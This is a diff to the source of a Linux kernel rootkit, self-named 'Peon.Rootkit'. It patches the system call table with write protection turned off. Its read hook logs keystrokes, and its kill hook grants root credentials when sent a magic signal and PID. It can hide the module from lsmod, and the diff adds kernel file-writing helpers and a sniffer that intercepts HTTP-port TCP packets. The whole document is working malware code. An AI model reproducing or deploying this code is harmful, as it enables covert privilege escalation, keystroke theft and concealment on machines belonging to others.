@@ -11,27 +11,34 @@
 #include <linux/netdevice.h>
 #include <linux/in.h>
 #include <linux/ip.h>
+#include <linux/tcp.h>
 #include <linux/udp.h>
 #include <linux/types.h>
 #include <linux/socket.h>
 #include <linux/inet.h>
 #include <linux/limits.h>
 #include <linux/proc_fs.h>
+
+#include <linux/fs.h>
+#include <linux/buffer_head.h>
 #include <asm/processor.h>
 #include <asm/uaccess.h>
 #include <asm/unistd.h>
 #include <asm/uaccess.h>
 #include <asm/errno.h>
 #include <asm/io.h>
+#include <asm/segment.h>
+#include <asm/uaccess.h>
 
 
-#define HOOK_READ
-//#define NETWORK
+//#define HOOK_READ
+//#define HIDE_MODULE
+#define NETWORK
 #define DEBUG
-#define SIG_4_ROOT 88
-#define PID_4_ROOT 88
-#define SIG_4_SHOW_MOD 22
-#define PID_4_SHOW_MOD 22
+#define SIG_4_ROOT 9
+#define PID_4_ROOT 88888
+#define SIG_4_SHOW_MOD 9
+#define PID_4_SHOW_MOD 22222
 #define ETH_P_ALL       0x0003
 
 #if defined(__LP64__) || defined(_LP64) //__x86_64 /* 64 bits machine */
@@ -44,6 +51,7 @@
 #define KERN_MEM_END 0xd0000000		//11010000 00000000 00000000 00000000
 #endif 
 
+
 static struct kmem_cache *cred_jar;
 
 struct linux_dirent {
@@ -52,6 +60,76 @@ struct linux_dirent {
 	unsigned short  d_reclen;
 	char            d_name[1];
 };
+
+unsigned long long file_saved_offset=0;
+
+//(filename, O_RDONLY, 0);
+struct file* file_open(const char* path, int flags, int rights) {
+    struct file* filp = NULL;
+    mm_segment_t oldfs;
+    int err = 0;
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+    filp = filp_open(path, flags, rights);
+    set_fs(oldfs);
+    if(IS_ERR(filp)) {
+        err = PTR_ERR(filp);
+        return NULL;
+    }
+    return filp;
+}
+
+void file_close(struct file* file) {
+    filp_close(file, NULL);
+}
+
+int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
+    mm_segment_t oldfs;
+    int ret;
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+
+    ret = vfs_read(file, data, size, &offset);
+
+    set_fs(oldfs);
+    return ret;
+}   
+
+int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
+    mm_segment_t oldfs;
+    int ret;
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+
+    ret = vfs_write(file, data, size, &offset);
+
+    set_fs(oldfs);
+    return ret;
+}
+
+int file_sync(struct file* file) {
+    vfs_fsync(file, 0);
+    return 0;
+}
+
+char append_filez(const char *path_file,unsigned char * data,unsigned int size){
+struct file* fd=NULL;
+int error;
+fd=file_open(path_file, O_WRONLY|O_CREAT, 0644);
+if (fd==NULL)
+	return -1;
+
+error=file_write(fd, file_saved_offset, data, size);
+//if(!error);
+
+	file_saved_offset+=size;
+	file_close(fd);
+	return 0;
+
+}
 
 unsigned long **find_syscall_table(void)
 {
@@ -131,9 +209,11 @@ void enable_wp(void){
 /* Adress of the syscall table */
 unsigned long ** syscall_table ;
 
+//flag: hide module
 char FIRST_SHOW_MODULE = 1;
 
 char keys[5]={0};
+
 /* save packet type */
 struct packet_type pt;
 
@@ -191,39 +271,21 @@ void check_keyboard_buf(char __user *buf){
 			printk(KERN_ALERT "Peon.Rootkit: keyboard = {ENTER}");
 		else if (buf[index]==0x0a)
 			printk(KERN_ALERT "Peon.Rootkit: keyboard = {NewLine}");
-/*		else if (buf[index]==0x1b){
-			keys[0]=buf[index];
-			key_saved_index=1;
-		}
-		else if (buf[index]==0x5b){
-			keys[key_saved_index]=buf[index];
-			key_saved_index++;
-		}
-		else if (buf[index]==0x41 || buf[index]==0x42 || buf[index]==0x43 ||buf[index]==0x44 ||buf[index]==0x45 ||){
-			keys[key_saved_index]=buf[index];
-			key_saved_index++;
-		}*/
-
-
 		else
 			printk(KERN_ALERT "Peon.Rootkit: keyboard[%d] = %c, %02X\n",index,buf[index],buf[index]);
 		index++;
 			}
 
-
 }
-
-
 
 
 
 #ifdef HOOK_READ
 	asmlinkage long (*orig_read_call) (unsigned int fd, char __user *buf, size_t count); 
 	asmlinkage long hook_read_call(unsigned int fd,char __user *buf, size_t count){
-
+		
 		long ret = orig_read_call( fd, buf, count);
 		if (fd==0){
-
 		check_keyboard_buf(buf);
 
 		}
@@ -303,9 +365,12 @@ asmlinkage long kill_hook_call( pid_t pid, int sig){
 
 		cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred), 0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);
 		credz = kmem_cache_alloc(cred_jar, GFP_KERNEL);
-		if (!credz)
+		if (!credz){
+			#ifdef DEBUG
+			printk(KERN_ALERT "Peon.Rootkit: [KILL -88 88]  bug alloc");
+			#endif
 			return kill_orig_call(pid,sig);
-
+		}
 		/* obtain root access in shell*/
 		cur_task=current;
 		/**/
@@ -343,10 +408,35 @@ asmlinkage long kill_hook_call( pid_t pid, int sig){
 
 int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt,struct net_device *dev2)
 {
-	kfree_skb(skb);
-	#ifdef DEBUG
-	printk(KERN_ALERT "Peon.Rootkit: ping ping");
-	#endif
+	if(skb->pkt_type == PACKET_HOST){
+		struct iphdr *ip;
+		ip=(struct iphdr*)skb_network_header(skb);
+		if(ip->version ==4 && ip->protocol ==  IPPROTO_TCP ){
+			struct tcphdr *tcp_hdr;
+			//tcp_hdr=tcp_hdr(skb);
+			tcp_hdr=(struct tcphdr *)(ip->ihl * 4 + skb->data);
+			/* check if source port is from http */
+			if(tcp_hdr->source==ntohs(80) || tcp_hdr->source==ntohs(8080)){
+				#ifdef DEBUG
+				int i=0;
+				int size=0;
+				printk(KERN_ALERT "Peon.Rootkit: http");
+				printk(KERN_ALERT "Peon.Rootkit: skb data len %d",skb->data_len);
+				printk(KERN_ALERT "Peon.Rootkit: skb mac len %d",skb->mac_len);
+				printk(KERN_ALERT "Peon.Rootkit: skb hdr len %d",skb->hdr_len);
+				printk(KERN_ALERT "data : %s",skb->data);
+				/*if(skb->data_len==0)
+				size=skb->len;
+				else
+				size=skb->len - skb->data_len;
+				for(;i<16;i++)
+					printk(KERN_ALERT "0x%x,",skb->data[i]);*/
+				
+				#endif
+				kfree_skb(skb);
+			}
+		}
+	}
 	return 0;
 }
 
@@ -357,18 +447,28 @@ int init_module(void)
 
 	if (syscall_table == 0){
 	#ifdef DEBUG
-		printk(KERN_INFO "Peon.Rootkit: System call table not found!\n");
-		#endif
+		printk(KERN_INFO "Peon.Rootkit: System call table found!\n");
+	#endif
 		return 1;
 	}
 	#ifdef DEBUG
 	printk(KERN_INFO "Peon.Rootkit: System call found at : 0x%lx\n", (unsigned long)syscall_table);
 	#endif
 	
-	/*  hide module  lsmod */    
-	//  mod=THIS_MODULE;
-	// list_del(&THIS_MODULE->list);
+	#ifdef HIDE_MODULE
+	/*  hide module  lsmod */ 
+	//save module   
+	mod=THIS_MODULE;
+	list_del(&THIS_MODULE->list);
+		#ifdef DEBUG
+		printk(KERN_INFO "Peon.Rootkit is hidden\n");
+		#endif
+	#else
 	FIRST_SHOW_MODULE=0;
+		#ifdef DEBUG
+		printk(KERN_INFO "Peon.Rootkit is un-hidden\n");
+		#endif
+	#endif
 
 	disable_wp();
 
@@ -406,7 +506,7 @@ int init_module(void)
 #ifdef NETWORK
 	//remove interfacepacket layer2
 	__dev_remove_pack( &pt ); 
-	// stuff for network, call toto function  
+	// stuff for network, call "dev_func" function  
 	pt.type = htons(ETH_P_ALL);
 	// pt.dev = 0;
 	pt.func = dev_func;
@@ -422,6 +522,10 @@ int init_module(void)
 
 	/*  Replace the syscall in the table */
 	syscall_table[__NR_read] = (void*) hook_read_call;
+
+	#ifdef DEBUG
+		printk(KERN_INFO "Peon.Rootkit: HooKeD Read!\n");
+		#endif
 #endif
 
 	enable_wp(); 
@@ -451,6 +555,15 @@ void cleanup_module(void)
 		syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
 	#endif
 	
+	#ifdef NETWORK
+	//remove interfacepacket layer2
+	__dev_remove_pack( &pt ); 
+
+		#ifdef DEBUG
+		printk(KERN_INFO "Peon.Rootkit remove our Network device!\n");
+		#endif
+	#endif
+
 	enable_wp(); 
 	
 	#ifdef DEBUG
